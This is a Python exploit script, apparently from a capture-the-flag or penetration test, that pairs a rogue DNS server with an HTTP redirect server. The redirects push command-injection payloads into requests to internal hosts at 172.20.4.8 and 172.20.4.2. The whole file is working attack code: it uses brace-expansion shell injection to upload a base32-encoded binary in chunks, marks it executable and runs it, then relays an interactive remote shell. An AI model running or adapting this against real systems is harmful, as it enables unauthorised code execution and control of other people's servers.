import os, sys, readline, base64, tempfile, urllib.parse, dnslib.server, requests
from http.server import HTTPServer, BaseHTTPRequestHandler

IP = requests.get('https://api.ipify.org').text
filename = tempfile.mktemp()
contents = base64.b32encode(open(sys.argv[1],"rb").read())
MAX_BUFFER = 4000
chunks = [contents[i:i+MAX_BUFFER] for i in range(0, len(contents), MAX_BUFFER)]
chunk_index = 0
start_shell = False

class Redirect(BaseHTTPRequestHandler):
    def do_POST(self):
        global filename, contents, MAX_BUFFER, chunks, chunk_index, start_shell
        os.write(tempfile.mkstemp()[0], self.rfile.read())
        self.send_response(302)
        print("req: " + self.path)
        if self.path == '/fdr' and not start_shell:
            if chunk_index < len(chunks):
                chunk = chunks[chunk_index].decode()
                chunk_index += 1
                cmd = "{echo,-n,%s}|{base32,-d}|{tee,-a,%s}" % (chunk, filename)
            else:
                cmd = "{chmod,0777,%s};%s"%(filename, filename)
                start_shell = True
            print("res: " + cmd)
            self.send_header('Location', "http://172.20.4.8:23/;%s;"%(cmd))
            self.end_headers()
        else:
            self.do_GET()

    def do_GET(self):
        print("req(get): " + self.path)
        self.send_response(302)
        if self.path.startswith('/out/'):
            self.send_header('Location',
                             'http://172.20.4.2:9980/' +
                             urllib.parse.quote(
                                 input('shell: \n' +
                                       urllib.parse.unquote(
                                           self.path
                                       ) + '\n > ')))
        else:
            print("res: 9980/id")
            self.send_header('Location', 'http://172.20.4.2:9980/id')
        self.end_headers()

class Resolver:
     def resolve(self, request, handler):
         reply = request.reply()
         print("dns req")
         reply.add_answer(*dnslib.server.RR.fromZone("fdr.example.com. 60 A %s"%IP))
         return reply

dnslib.server.DNSServer(Resolver()).start_thread()

print("%s:53"%IP)

print("Waiting for first request..")

HTTPServer(("", 80), Redirect).serve_forever()
